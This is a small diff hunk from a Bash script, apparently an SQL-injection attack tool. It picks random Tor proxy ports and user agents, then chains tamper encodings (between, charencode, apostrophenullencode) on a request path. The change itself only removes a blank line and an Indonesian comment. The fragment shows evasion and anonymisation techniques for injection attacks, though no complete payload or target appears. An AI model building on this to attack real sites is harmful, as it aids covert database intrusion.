@@ -73,8 +73,6 @@ vector_sqli_agressor_left() {
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-
-        # === KOMBO 8 TAMPER INTEGRASI PORTABLE ===
         local t1=$(between_engine "$default_path")
         local t2=$(charencode_engine "$t1")
         local t3=$(apostrophenullencode_engine "$t2")
